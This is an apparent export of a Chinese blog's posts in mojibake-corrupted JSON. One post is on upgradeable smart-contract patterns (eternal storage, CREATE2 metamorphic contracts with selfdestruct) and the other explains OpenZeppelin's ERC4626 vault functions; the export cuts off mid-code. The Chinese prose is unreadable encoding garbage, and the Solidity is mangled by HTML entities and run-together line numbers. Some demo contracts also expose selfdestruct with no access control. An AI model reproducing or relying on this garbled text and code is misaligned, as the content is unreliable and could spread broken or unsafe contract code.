æœ¬æ¬¡å¤ç°ä½¿ç”¨äº†ä¸‰ä¸ªåˆçº¦ï¼š StorageTicketsï¼šè´Ÿè´£å­˜å‚¨æ•°æ®ï¼Œè¿™ä¸ªåˆçº¦å§‹ç»ˆæ˜¯ä¸å˜çš„ï¼Œè´Ÿè´£è®°å½•ç¥¨æ•°å’Œè´¦æˆ·æ˜¯å¦æŠ•ç¥¨çš„æƒ…å†µ V1ï¼šé€»è¾‘åˆçº¦çš„V1ç‰ˆæœ¬ï¼Œå…·æœ‰æŠ•ç¥¨å’ŒæŸ¥è¯¢ç¥¨æ•°åŠŸèƒ½ï¼Œè¿˜å…·æœ‰è½¬ç§» StorageTicktsåˆçº¦æ‰€æœ‰æƒçš„åŠŸèƒ½ï¼ˆå…·æœ‰è®¿é—®æ§åˆ¶ï¼‰ã€‚ V2ï¼šé€»è¾‘åˆçº¦çš„V2ç‰ˆæœ¬ï¼Œå…·æœ‰æŠ•ç¥¨å’ŒæŸ¥è¯¢ç¥¨æ•°åŠŸèƒ½ï¼Œä½†æ˜¯æ¯ä¸ªç”¨æˆ·åªèƒ½æŠ•ä¸€æ¬¡ï¼Œè¿˜å…·æœ‰è½¬ç§» StorageTicktsåˆçº¦æ‰€æœ‰æƒçš„åŠŸèƒ½ï¼ˆå…·æœ‰è®¿é—®æ§åˆ¶ï¼‰ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364// SPDX-License-Identifier: MITpragma solidity ^0.8.20;import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol&quot;;contract StorageTickets is Ownable &#123; mapping(bytes32 =&gt; uint) VoteAmounts; // solt 1 mapping(address =&gt; bool) BooleanVote; // slot 2 constructor() Ownable(msg.sender) &#123;&#125; function getVoteAmounts(bytes32 record) public view returns (uint) &#123; return VoteAmounts[record]; &#125; function setVoteAmounts(bytes32 record, uint value) public &#123; VoteAmounts[record] = value; &#125; function getBooleanVote(address account) public view returns (bool)&#123; return BooleanVote[account]; &#125; function setBooleanVote(address account, bool value) public &#123; BooleanVote[account] = value; &#125;&#125;// V1 ç‰ˆæœ¬contract V1 &#123; address owner; StorageTickets storageTickets; constructor(address _storageTickets) &#123; owner = msg.sender; storageTickets = StorageTickets(_storageTickets); &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; // æŸ¥è¯¢ keccak256(abi.encodePacked(&quot;votes&quot;))è·å–çš„ç¥¨æ•° function getNumberOfVotes() public view returns (uint256) &#123; bytes32 votes = keccak256(abi.encodePacked(&quot;votes&quot;)); return storageTickets.getVoteAmounts(votes); &#125; // æŠ•ç¥¨ function vote() public &#123; bytes32 votes = keccak256(abi.encodePacked(&quot;votes&quot;)); storageTickets.setVoteAmounts(votes, storageTickets.getVoteAmounts(votes) + 1); &#125; function transferOwner(address _newOwner) public onlyOwner &#123; storageTickets.transferOwnership(_newOwner); &#125;&#125; å…ˆéƒ¨ç½² StorageTickets.sol å°†éƒ¨ç½²ç”Ÿæˆçš„åœ°å€ä½œä¸ºV1æ„é€ å™¨çš„å‚æ•°ï¼Œéƒ¨ç½²V1 StorageTicketsçš„æ‰€æœ‰è€…å°†æ‰€æœ‰æƒé€šè¿‡transferOwnerShip()å‡½æ•°ï¼Œç§»äº¤æ‰€æœ‰æƒç»™V1 ç”¨æˆ·0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02dbè¿ç»­5æ¬¡ç‚¹å‡»V1çš„voteå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°ç¥¨æ•°ä¸º5ã€‚ å‡å¦‚æ­¤æ—¶é¡¹ç›®æ–¹å‘ç°è¿™ä¸ªæ˜æ˜¾çš„bugï¼Œæ²¡æœ‰é™åˆ¶æ¯ä¸ªç”¨æˆ·çš„æŠ•ç¥¨æ¬¡æ•°ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æœ‰äººæ¶æ„åˆ·å•ï¼Œé¡¹ç›®æ–¹æ˜ç¡®è§„å®šæ¯äººåªèƒ½æŠ•ä¸€æ¬¡ç¥¨ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾åˆçº¦éœ€è¦å‡çº§ï¼Œå‡çº§æˆV2ç‰ˆæœ¬ã€‚ 12345678910111213141516171819202122232425262728293031323334// V2 ç‰ˆæœ¬contract V2 &#123; address owner; StorageTickets storageTickets; constructor(address _storageTickets) &#123; owner = msg.sender; storageTickets = StorageTickets(_storageTickets); &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; // æŸ¥è¯¢ keccak256(abi.encodePacked(&quot;votes&quot;))è·å–çš„ç¥¨æ•° function getNumberOfVotes() public view returns (uint256) &#123; bytes32 votes = keccak256(abi.encodePacked(&quot;votes&quot;)); return storageTickets.getVoteAmounts(votes); &#125; // æŠ•ç¥¨ function vote() public &#123; require(storageTickets.getBooleanVote(msg.sender) == false, &quot;Fail, you have already voted:)&quot;); storageTickets.setBooleanVote(msg.sender, true); bytes32 votes = keccak256(abi.encodePacked(&quot;votes&quot;)); storageTickets.setVoteAmounts(votes, storageTickets.getVoteAmounts(votes) + 1); &#125; function transferOwner(address _newOwner) public onlyOwner &#123; storageTickets.transferOwnership(_newOwner); &#125;&#125; è¿˜æ˜¯ä¼ å…¥åŸå§‹çš„storageTicketsåˆçº¦åœ°å€éƒ¨ç½²V2 V1åˆçº¦çš„æ‰€æœ‰è€…ç§»äº¤æ‰€æœ‰æƒç»™V2 æ­¤æ—¶keacck256(&quot;vote&quot;)çš„ç¥¨æ•°è¿˜æ˜¯5ç¥¨ ç”¨æˆ·0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02dbè¿˜æƒ³åƒä¹‹å‰é‚£æ ·ä¸æ–­çš„æŠ•ç¥¨ï¼Œå½“ä»–ç¬¬äºŒæ¬¡è¿›è¡ŒæŠ•ç¥¨æ—¶ï¼Œä»–çš„æ“ä½œè¢«revert()äº†ã€‚ 2.3 ä¼˜ç¼ºç‚¹ä¼˜ç‚¹ï¼š å®¹æ˜“ç†è§£å’Œä¸Šæ‰‹ æ¶ˆé™¤äº†åˆçº¦æ›´æ–°åæ•°æ®çš„è¿ç§»é—®é¢˜ ç¼ºç‚¹ï¼š æ•°æ®å˜é‡çš„è®¿é—®æ¨¡å¼å¾ˆå›°éš¾ï¼Œæ¯”å¦‚éœ€è¦åœ¨æ•°æ®åˆçº¦ä¸­æ·»åŠ ä¸€ä¸ªå˜é‡è€Œå®ŒæˆæŸç§çš„åŠŸèƒ½ï¼Œè¿™å‡ ä¹ä¸å¯èƒ½å®ç°ï¼Œé™¤éé‡æ–°éƒ¨ç½²ä¸€ä¸ªæ•°æ®åˆçº¦ï¼Œé‚£ä¹ˆè¿™è¿˜æ˜¯éœ€è¦å¤§é‡çš„gasæˆæœ¬ å¢åŠ äº†å¤æ‚çš„æ‰€æœ‰æƒæˆæƒæ¨¡å¼ 3. Metamorphic Contractsè¯‘æ–‡ï¼šå˜å½¢åˆçº¦ã€‚ å¿½ç•¥æ•°æ®ä¸å˜æ€§ï¼Œè¿™ä¹Ÿç®—æ˜¯ä¸€ç§å¯å‡çº§åˆçº¦çš„æ–¹å¼ï¼Œè¿™æ˜¯é‡‡ç”¨create2çš„æ“ä½œç å®ç°çš„ã€‚ä¼—æ‰€å‘¨çŸ¥ï¼Œåœ¨ä»¥å¤ªåŠä¸­éƒ¨ç½²åˆçº¦å¯ä»¥è·å–åˆ°ä¸€ä¸ªåœ°å€ï¼Œåœ¨ä»£ç ä¸­æ“ä½œçš„ä¹Ÿæ˜¯åˆçº¦åœ°å€ï¼Œé‚£ä¹ˆç†è®ºä¸Šï¼Œä¸€ä¸ªåˆçº¦åœ°å€å¯ä»¥çœ‹æˆæ˜¯ä¸€ä¸ªåˆçº¦ï¼Œåˆçº¦åœ°å€ä¸å˜ï¼Œé‚£ä¹ˆå°±å¯ä»¥é—´æ¥çœ‹ä½œæ˜¯åˆçº¦æ²¡æœ‰æ”¹å˜ã€‚è€Œé€šè¿‡create2æ“ä½œç è¿›è¡Œå‡çº§çš„ç†å¿µä¾¿æ˜¯ï¼Œåœ¨åŒä¸€ä¸ªåˆçº¦åœ°å€ä¸Šéƒ¨ç½²ä¸Šä¸åŒçš„é€»è¾‘ï¼Œåˆçº¦çš„æ‰§è¡Œé€»è¾‘ä¸»è¦æ˜¯ä¾é runtimeCodeï¼Œè¿™è¦æ¯æ¬¡éƒ¨ç½²åˆçº¦æ—¶ä¼ å…¥çš„runtimeCodeä¸ä¸€æ ·å°±èƒ½å®ç°ã€‚ 3.1 å¤ç°é‚£ä¹ˆå¦‚ä½•é‡å¤éƒ¨ç½²åŒä¸€ä¸ªåˆçº¦åœ°å€å‘¢ï¼Ÿ è¿™éœ€è¦ç”¨åˆ°selfdestructå’Œcreate2ç›ã€‚selfdestructè´Ÿè´£é”€æ¯åˆçº¦ï¼Œåªæœ‰é”€æ¯äº†åˆçº¦æ‰èƒ½å†éƒ¨ç½²åŒä¸€åˆçº¦åœ°å€ï¼Œæ­¤å¤–ï¼Œè‡ªæ¯åŠŸèƒ½æ˜¯å¿…é¡»è¦æä¾›çš„ï¼Œå¦åˆ™è¯¥å‡çº§æ¨¡å¼å°†ä¼šå¤±è´¥ã€‚è€Œä¸”è‡ªæ¯åŠŸèƒ½éœ€è¦æœ‰è®¿é—®æ§åˆ¶ã€‚ 12// create2éƒ¨ç½²åˆçº¦çš„åŸç†0xFF + address(deployer) + salt+ keccak256(creationCode) é€šè¿‡create2éƒ¨ç½²åˆçº¦åˆ°åŒä¸€ä¸ªåœ°å€ï¼Œ0xFFã€address(deployer)å’Œsaltå®¹æ˜“ä¿è¯ä¸å˜ï¼Œä½†æ˜¯è¦æ›¿æ¢åŸåˆçº¦çš„é€»è¾‘ï¼Œåˆ™å¿…é¡»è¦æ›´æ”¹åˆçº¦çš„å†…å®¹ï¼Œè¿™æ ·ä¸€æ¥creationCodeä¸å°±ä¼šå‘ç”Ÿæ”¹å˜äº†å—ï¼Œæœ‰ä»€ä¹ˆåŠæ³•èƒ½ä¿è¯creationCodeä¸å˜ï¼Œè€ŒruntimeCodeæ”¹å˜ï¼Ÿ ç­”æ¡ˆï¼šæœ‰çš„ã€‚å¯ä»¥é€šè¿‡solidityçš„æ±‡ç¼–è¯­è¨€ï¼Œè¿”å›å‡½æ•°çš„runtimecodeï¼Œè€Œè¿™ä¸ªruntimeCodeä»æ„é€ å™¨ä¸­ä¼ å…¥ï¼Œç›´æ¥çœ‹ä»£ç ã€‚ 1234567891011contract Target &#123; constructor() &#123; Factory factory = Factory(msg.sender); bytes memory runtimeCode = factory.runtimeCode(); assembly &#123; return(add(runtimeCode, 0x20), mload(runtimeCode)) &#125; &#125;&#125; è¿™æ˜¯ç›®æ ‡åˆçº¦ï¼Œé€šè¿‡Targetçš„creationCodeä¸å˜ï¼Œä»è€Œè¾¾æˆä¸Šè¿°è¦æ±‚ã€‚ 12345678910111213141516171819202122232425contract Factory &#123; address public owner; bytes public runtimeCode; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function deploy(bytes memory _runtimeCode) external onlyOwner returns(address target) &#123; runtimeCode = _runtimeCode; bytes memory creationCode = type(Target).creationCode; assembly &#123; target := create2( 0, // msg.value add(creationCode, 0x20), // the start of data mload(creationCode), // creationCode.length 0x00 // salt ) &#125; &#125;&#125; è¿™æ˜¯å·¥å‚åˆçº¦è´Ÿè´£éƒ¨ç½²ç›®æ ‡åˆçº¦ï¼Œéƒ¨ç½²åŠŸèƒ½éœ€è¦æœ‰è®¿é—®æ§åˆ¶ï¼Œé¢„é˜²æ¶æ„æ“ä½œã€‚ å¤ç°ï¼š æµ‹è¯•åˆçº¦ï¼š 12345678910111213141516171819contract Test &#123; address target; constructor(address _target) &#123; target = _target; &#125; function test() public returns(uint256) &#123; (bool ok, bytes memory rtd) = target.call(abi.encodeWithSignature(&quot;cal(uint256,uint256)&quot;, 1, 2)); require(ok, &quot;call fail:)&quot;); return abi.decode(rtd, (uint256)); &#125; function kill() public &#123; (bool ok, bytes memory rtd) = target.call(abi.encodeWithSignature(&quot;kill()&quot;)); require(ok, &quot;kill fail(:&quot;); &#125;&#125; è¾…åŠ©åˆçº¦ï¼Œè·å–V1å’ŒV2çš„runtimeCodeï¼š 1234567891011contract GetRuntimeCode &#123; function getV1() public pure returns (bytes memory)&#123; return type(Logic_V1).runtimeCode; &#125; function getV2() public pure returns (bytes memory)&#123; return type(Logic_V2).runtimeCode; &#125;&#125; é€»è¾‘åˆçº¦V1ï¼Œè®¡ç®—æ–¹å¼ä¸ºåŠ æ³•è¿ç®—: 12345678910contract Logic_V1 &#123; function cal(uint256 n1, uint256 n2) external pure returns (uint256) &#123; return n1 + n2; &#125; function kill() public &#123; selfdestruct(payable(msg.sender)); &#125;&#125; é€»è¾‘åˆçº¦V2ï¼Œè®¡ç®—æ–¹å¼ä¸ºä¹˜æ³•è¿ç®—ï¼š 12345678910contract Logic_V2 &#123; function cal(uint256 n1, uint256 n2) external pure returns (uint256) &#123; return n1 * n2; &#125; function kill() public &#123; selfdestruct(payable(tx.origin)); &#125;&#125; æ‰§è¡Œé€»è¾‘ï¼š éƒ¨ç½²GetRuntimeCodeåˆçº¦ éƒ¨ç½²Factoryåˆçº¦ é€šè¿‡GetRuntimeCodeåˆçº¦çš„getV1()å‡½æ•°è·å–ï¼ŒV1çš„runtimeCode: run_v1ã€‚ å°†run_v1ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨deploy()å‡½æ•°ï¼Œéƒ¨ç½²Targetåˆçº¦ï¼Œ åœ°å€ä¸ºï¼š0x0c1720ee8283EB0D46170ba774098Ae648C701c1ã€‚ å°†è¯¥åœ°å€ä½œä¸ºå‚æ•°ï¼Œéƒ¨ç½²Teståˆçº¦ï¼Œå¹¶è°ƒç”¨ test()å‡½æ•°ï¼Œç»“æœå¦‚ä¸‹ï¼š å‡çº§é€»è¾‘ï¼š è°ƒç”¨ Teståˆçº¦çš„killå‡½æ•°ï¼Œå°†targetåˆçº¦é”€æ¯ã€‚ é€šè¿‡GetRuntimeCodeåˆçº¦çš„getV2()å‡½æ•°è·å–ï¼ŒV2çš„runtimeCode: run_v2ã€‚ å°†run_v2ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨deploy()å‡½æ•°ï¼Œéƒ¨ç½²Targetåˆçº¦ï¼Œ éšåç»§ç»­è°ƒç”¨ test()å‡½æ•°ï¼Œç»“æœå¦‚ä¸‹ï¼š æ­¤æ—¶ï¼Œä½ ä¼šå‘ç°ç»“æœè¿˜æ˜¯åŸæ¥çš„3ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿï¼Ÿ è¿™æ˜¯å› ä¸ºåœ¨EIP-4756ä¸­æåŠè¿‡ï¼Œå°†ç§»é™¤selfdestructè¿™ä¸€æ“ä½œç ï¼Œè¿™ä¹Ÿæ˜¯è¯¥ç§åˆçº¦å‡çº§æ¨¡å¼çš„å¼Šç«¯ä¹‹ä¸€ã€‚ çœ‹åˆ°æˆ‘ä½¿ç”¨çš„ç¼–è¯‘ç‰ˆæœ¬ï¼š åœ¨Cancunç¡¬åˆ†å‰ä¹‹åï¼Œè¿™ä¸ªè‡ªæ¯åŠŸèƒ½æ˜¯è¢«ç§»é™¤äº†çš„ï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•å¤ç°å‘¢ï¼Ÿ ç­”æ¡ˆï¼šæ¢ä¸€ä¸ªç½‘ç»œï¼Œä»¥åŠæ¢ä½ç‰ˆæœ¬ç¼–è¯‘å™¨ã€‚æˆ‘æ¢æˆå¦‚ä¸‹ï¼š å†æ¬¡é‡å¤å¦‚ä¸Šæ­¥éª¤ï¼Œè¾“å‡ºç»“æœä¸ºï¼š2ã€‚ å¤ç°å®Œæ¯•ã€‚å½“ç„¶å®é™…æ¡ˆä¾‹éœ€è¦æ·»åŠ è®¿é—®æ§åˆ¶ã€‚ 3.2 è°ˆè°ˆè¯¥æ¨¡å¼çš„å¥½ä¸å å¥½ï¼š ä¸éœ€è¦ä½¿ç”¨delegatecallä»£ç†ï¼Œæ•ˆç‡é«˜ä¸éœ€è¦è½¬å‘è°ƒåº¦ã€‚ ä¸éœ€è¦ä½¿ç”¨initialize()ä»£æ›¿constructor()ã€‚ åï¼š selfdestructåœ¨æ¥ä¸‹æ¥çš„ç½‘ç»œå‡çº§ä¸­ä¼šå¯èƒ½ä¼šè¢«ç§»é™¤ã€‚ selfdestructä¼šå°†åˆçº¦æ•°æ®æŠ¹é™¤ã€‚ éœ€è¦çš„æˆæœ¬è¾ƒé«˜ï¼Œå‡çº§ä¸€æ¬¡éœ€è¦æ‰§è¡Œä¸€æ¬¡selfdestructå’Œéƒ¨ç½²ä¸€æ¬¡åˆçº¦ã€‚","categories":[{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"proxy","slug":"DEFI/proxy","permalink":"https://biyouqiuqiu.com/categories/DEFI/proxy/"}],"tags":[{"name":"Upgradeable","slug":"Upgradeable","permalink":"https://biyouqiuqiu.com/tags/Upgradeable/"}]},{"title":"ERC4626","slug":"DEFI/ERC/ERC4626","date":"2024-01-20T04:00:00.000Z","updated":"2024-01-20T04:00:00.000Z","comments":true,"path":"2024/01/20/DEFI/ERC/ERC4626/","link":"","permalink":"https://biyouqiuqiu.com/2024/01/20/DEFI/ERC/ERC4626/","excerpt":"","text":"1. ERC4626ç®€ä»‹ ERC4626 åè®®æ˜¯ä¸€ç§ç”¨äºä»£å¸åŒ–ä¿é™©åº“çš„æ ‡å‡†ï¼Œå®ƒå¯ä»¥ä¼˜åŒ–å’Œç»Ÿä¸€æ”¶ç›Šä¿é™©åº“çš„æŠ€æœ¯å‚æ•°ã€‚æ”¶ç›Šä¿é™©åº“æ˜¯æŒ‡ä½¿ç”¨ä¸åŒç­–ç•¥æ¥ä¸ºç”¨æˆ·æä¾›æœ€ä½³æ”¶ç›Šçš„åˆçº¦ï¼Œä¾‹å¦‚å€Ÿè´·å¸‚åœºã€èšåˆå™¨æˆ–æœ¬èº«å…·æœ‰åˆ©æ¯çš„ä»£å¸ã€‚ERC4626 åè®®æä¾›äº†ä¸€ä¸ªæ ‡å‡†çš„ APIï¼Œç”¨äºè¡¨ç¤ºå•ä¸ªåº•å±‚ ERC-20 ä»£å¸çš„æ”¶ç›Šä¿é™©åº“ä»½é¢ã€‚ ç”¨æˆ·é€šè¿‡å­˜å…¥ ERC20 Tokenï¼Œä»è€Œè·å–ä¸€å®šæ¯”ä¾‹çš„ vTokenã€‚åœ¨erc20 Token å­˜å…¥çš„è¿‡ç¨‹ä¸­ï¼Œä¼šåœ¨ä¸€å®šçš„æ—¶é—´å†…äº§ç”Ÿæ”¶ç›Šã€‚åœ¨æ”¶ç›Šåˆ°æœŸåï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡æŒæœ‰çš„vTokenä¸ªæ•°ï¼Œè·å¾—ä¸€å®šæ¯”ä¾‹çš„æ”¶ç›Šæ±‡æŠ¥ã€‚ æ­¤å¤–ERC4626ç»§æ‰¿äº†ERC20ï¼Œå…·æœ‰ERC20æ‰€å…·æœ‰çš„æ‰€æœ‰åŠŸèƒ½ï¼Œè€Œä¸”è¿˜å¿…é¡»å®ç° IERC20Metadataæ¥å£ã€‚ ä¸¾ä¸ªä¾‹å­æ¥ç†è§£è¿™ä¸ªç³»ç»Ÿï¼Œ ERC4626çš„åŸºç¡€ä»£å¸å¯ä»¥æ¯”ä½œæ˜¯ é»„é‡‘ï¼ˆ_assetï¼‰ï¼Œ è€Œé€šè¿‡å­˜å…¥ é»„é‡‘æ¥è·å–é’ç¥¨ï¼ˆsharesï¼‰ï¼Œæ—¢å¯ä»¥é€šè¿‡å­˜å…¥é»„é‡‘æ¥è·å–sharesï¼Œä¹Ÿå¯ä»¥é€šè¿‡shareså…‘æ¢å‡ºé»„é‡‘ã€‚ä¾‹å­ä¸æ˜¯å¾ˆå‡†ç¡®ï¼Œä½†æ˜¯å¯ä»¥åˆæ­¥äº†è§£è¿™æ˜¯ä¸€ä¸ªä»€ä¹ˆä¸œè¥¿ã€‚ 2. ERC4626ä»£ç è§£è¯»æºä»£ç ï¼šé“¾æ¥ã€‚ æ¥å£ä¸­å®šä¹‰çš„å‡½æ•°å¦‚ä¸‹ï¼š asset(): è¿”å›ä¿é™©åº“ä½¿ç”¨çš„åº•å±‚ä»£å¸çš„åœ°å€ï¼Œå¿…é¡»æ˜¯ä¸€ä¸ª ERC-20 åˆçº¦ã€‚ totalAssets(): è¿”å›ä¿é™©åº“æŒæœ‰çš„åº•å±‚èµ„äº§çš„æ€»é‡ï¼Œåº”è¯¥åŒ…æ‹¬ä»»ä½•ç”±æ”¶ç›Šäº§ç”Ÿçš„å¤åˆ©ã€‚ convertToShares(): è¿”å›ä¿é™©åº“ä¸ºç»™å®šæ•°é‡çš„åº•å±‚èµ„äº§å…‘æ¢çš„ä»½é¢æ•°é‡ã€‚ convertToAssets(): è¿”å›ä¿é™©åº“ä¸ºç»™å®šæ•°é‡çš„ä»½é¢å…‘æ¢çš„åº•å±‚èµ„äº§æ•°é‡ã€‚ maxDeposit(): è¿”å›æ¥æ”¶è€…åœ¨å•æ¬¡å­˜æ¬¾è°ƒç”¨ä¸­å¯ä»¥å­˜å…¥çš„åº•å±‚èµ„äº§çš„æœ€å¤§æ•°é‡ã€‚ previewDeposit(): å…è®¸ç”¨æˆ·åœ¨å½“å‰åŒºå—æ¨¡æ‹Ÿä»–ä»¬çš„å­˜æ¬¾æ•ˆæœã€‚ deposit(): å°†åº•å±‚èµ„äº§å­˜å…¥ä¿é™©åº“ï¼Œå¹¶å°†ä»½é¢æˆäºˆæ¥æ”¶è€…ã€‚ maxMint(): è¿”å›æ¥æ”¶è€…åœ¨å•æ¬¡é“¸é€ è°ƒç”¨ä¸­å¯ä»¥é“¸é€ çš„ä»½é¢çš„æœ€å¤§æ•°é‡ã€‚ previewMint(): å…è®¸ç”¨æˆ·åœ¨å½“å‰åŒºå—æ¨¡æ‹Ÿä»–ä»¬çš„é“¸é€ æ•ˆæœã€‚ mint(): å°†ä»½é¢é“¸é€ ç»™æ¥æ”¶è€…ï¼Œå¹¶ä»ä¿é™©åº“ä¸­å–å‡ºç›¸åº”æ•°é‡çš„åº•å±‚èµ„äº§ã€‚ maxWithdraw(): è¿”å›æ¥æ”¶è€…åœ¨å•æ¬¡å–æ¬¾è°ƒç”¨ä¸­å¯ä»¥å–å‡ºçš„åº•å±‚èµ„äº§çš„æœ€å¤§æ•°é‡ã€‚ previewWithdraw(): å…è®¸ç”¨æˆ·åœ¨å½“å‰åŒºå—æ¨¡æ‹Ÿä»–ä»¬çš„å–æ¬¾æ•ˆæœã€‚ withdraw(): å°†ä»½é¢ä»æ¥æ”¶è€…å¤„é”€æ¯ï¼Œå¹¶å°†ç›¸åº”æ•°é‡çš„åº•å±‚èµ„äº§ä»ä¿é™©åº“ä¸­å–å‡ºã€‚ maxRedeem(): è¿”å›æ¥æ”¶è€…åœ¨å•æ¬¡èµå›è°ƒç”¨ä¸­å¯ä»¥èµå›çš„ä»½é¢çš„æœ€å¤§æ•°é‡ã€‚ previewRedeem(): å…è®¸ç”¨æˆ·åœ¨å½“å‰åŒºå—æ¨¡æ‹Ÿä»–ä»¬çš„èµå›æ•ˆæœã€‚ redeem(): å°†ä»½é¢ä»æ¥æ”¶è€…å¤„é”€æ¯ï¼Œå¹¶å°†ç›¸åº”æ•°é‡çš„åº•å±‚èµ„äº§ä»ä¿é™©åº“ä¸­å–å‡ºã€‚ ä¸»åˆçº¦ï¼š 1IERC20 private immutable _asset; è¿™æ˜¯è¯¥é‡‘åº“ vaultçš„åŸºç¡€ä»£å¸ï¼Œç›¸å½“äºé»„é‡‘ã€‚ 1function _tryGetAssetDecimals(IERC20 asset_) private view returns (bool, uint8) è¯¥å‡½æ•°çš„ä½œç”¨æ˜¯è·å– åŸºç¡€ä»£å¸çš„ç²¾åº¦å€¼ï¼Œé€šè¿‡ staticcallæ¥è°ƒç”¨assert_çš„ decimals()å‡½æ•°è·å–è¯¥è§’åº¦å€¼ï¼Œå¦‚æœè°ƒç”¨æˆåŠŸåˆ™è¿”å›(true, uint8(returnedDecimals))ï¼Œå¦åˆ™(false, 0)ã€‚ 12function maxDeposit(address) public view virtual returns (uint256)function maxMint(address) public view virtual returns (uint256) æŸ¥è¯¢æŒ‡å®šåœ°å€å¯ä»¥å­˜å…¥&#x2F;é“¸é€ æœ€å¤šçš„æ•°ç›®ï¼ŒäºŒè€…éƒ½è¿”å›type(uint256).maxã€‚ 1function maxRedeem(address owner) public view virtual returns (uint256) æŸ¥è¯¢å¯ä»¥èµå›çš„æœ€å¤§èµ„äº§ï¼Œè¿™é‡Œè¿”å›çš„æ˜¯vTokençš„æ•°ç›®ã€‚ 123function _convertToShares(uint256 assets, Math.Rounding rounding) internal view virtual returns (uint256) &#123; return assets.mulDiv(totalSupply() + 10 ** _decimalsOffset(), totalAssets() + 1, rounding);&#125; å°†èµ„äº§è½¬åŒ–ä¸ºsharesï¼Œå¯ä»¥ç†è§£ä¸ºé»„é‡‘å…‘æ¢ä¸ºé’ç¥¨ï¼Œè¿™æ­¥è®¡ç®—å¯ä»¥æŠ½è±¡çœ‹ä½œæ˜¯ 1(assets * (totalSupply() + 10 ** _decimalsOffset())) / (totalAssets() + 1) 123function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view virtual returns (uint256) &#123; return shares.mulDiv(totalAssets() + 1, totalSupply() + 10 ** _decimalsOffset(), rounding);&#125; å°†sharesè½¬åŒ–ä¸ºèµ„äº§ï¼Œå¯ä»¥ç†è§£ä¸ºé’ç¥¨å…‘æ¢ä¸ºé»„é‡‘ï¼Œè¿™æ­¥è®¡ç®—å¯ä»¥æŠ½è±¡çœ‹ä½œæ˜¯ï¼š 1(shares * ((totalAssets() + 1) / (totalSupply() + 10 ** _decimalsOffset()))) 123function previewDeposit(uint256 assets) public view virtual returns (uint256) &#123; return _convertToShares(assets, Math.Rounding.Floor);&#125; è¯¥å‡½æ•°çš„åŠŸèƒ½æ˜¯æ­¤æ—¶è®¡ç®—å‡ºæŒ‡å®šçš„èµ„äº§å¯ä»¥å…‘æ¢å¤šå°‘sharesã€‚ 123function previewMint(uint256 shares) public view virtual returns (uint256) &#123; return _convertToAssets(shares, Math.Rounding.Ceil);&#125; è¯¥å‡½æ•°çš„åŠŸèƒ½æ˜¯æ­¤æ—¶è®¡ç®—æŒ‡å®šçš„shareså¯ä»¥å…‘æ¢æˆå¤šå°‘èµ„äº§ã€‚ 123function previewWithdraw(uint256 assets) public view virtual returns (uint256) &#123; return _convertToShares(assets, Math.Rounding.Ceil); &#125; è¯¥å‡½æ•°çš„åŠŸèƒ½æ˜¯æ­¤æ—¶è®¡ç®—æŒ‡å®šçš„shareså¯ä»¥å…‘æ¢æˆå¤šå°‘èµ„äº§ã€‚å’ŒpreviewMint()å‡½æ•°æå…¶ç›¸ä¼¼ã€‚ 123456function _deposit(address caller, address receiver, uint256 assets, uint256 shares) internal virtual &#123; SafeERC20.safeTransferFrom(_asset, caller, address(this), assets); _mint(receiver, shares); emit Deposit(caller, receiver, assets, shares);&#125; è¿™æ˜¯å­˜å…¥èµ„äº§çš„å†…éƒ¨å‡½æ•°ï¼Œé€šè¿‡SafeERC20çš„åº“å‡½æ•°ï¼Œå®Œæˆcallerå‘address(this)è½¬ç§»_assetä»£å¸æ“ä½œã€‚ 1function deposit(uint256 assets, address receiver) public virtual returns (uint256) å¤–éƒ¨çš„å­˜æ¬¾å‡½æ•°ï¼ŒåŠŸèƒ½æ˜¯msg.senderå¾€è¯¥ vaultå­˜å…¥æ‰§è¡Œæ•°é¢çš„èµ„äº§ï¼Œå¹¶å°†å…‘æ¢å‡ºçš„vTokenå‘é€åˆ°receiveråœ°å€ï¼Œé€šè¿‡mint()å‡½æ•°ï¼Œé“¸å¸æ•°é‡æ˜¯æ ¹æ®æ­¤æ—¶é‡‘åº“çŠ¶æ€è®¡ç®—çš„uint256 assets = previewMint(shares)ã€‚ 123456789101112131415function _withdraw( address caller, address receiver, address owner, uint256 assets, uint256 shares) internal virtual &#123; if (caller != owner) &#123; _spendAllowance(owner, caller, shares); &#125; _burn(owner, shares); SafeERC20.safeTransfer(_asset, receiver, assets); emit Withdraw(caller, receiver, owner, assets, shares);&#125; è¯¥åŠŸèƒ½æ˜¯å–å‡ºèµ„äº§çš„å†…éƒ¨å‡½æ•°ï¼Œè¦æ±‚è°ƒç”¨è€…msg.senderå¿…é¡»æ˜¯ownerï¼Œæˆ–è€…msg.senderè¢«owneræˆæƒã€‚é”€æ¯owneræ•°é‡ä¸ºsharesçš„vTokenï¼Œå¹¶ä»é‡‘åº“å‘receiverè½¬ç§»_assetä»£å¸ã€‚ 1234567891011function withdraw(uint256 assets, address receiver, address owner) public virtual returns (uint256) &#123; uint256 maxAssets = maxWithdraw(owner); if (assets &gt; maxAssets) &#123; revert ERC4626ExceededMaxWithdraw(owner, assets, maxAssets); &#125; uint256 shares = previewWithdraw(assets); _withdraw(_msgSender(), receiver, owner, assets, shares); return shares;&#125; å¤–éƒ¨çš„å–æ¬¾å‡½æ•°ï¼Œå®ç°é€»è¾‘æ˜¯è°ƒç”¨å†…éƒ¨çš„_withdraw()å‡½æ•°ã€‚å‚æ•°æ˜¯ä¼ å…¥å¾…å–å‡ºçš„èµ„äº§æ•°é‡ã€‚ 1234567891011function redeem(uint256 shares, address receiver, address owner) public virtual returns (uint256) &#123; uint256 maxShares = maxRedeem(owner); if (shares &gt; maxShares) &#123; revert ERC4626ExceededMaxRedeem(owner, 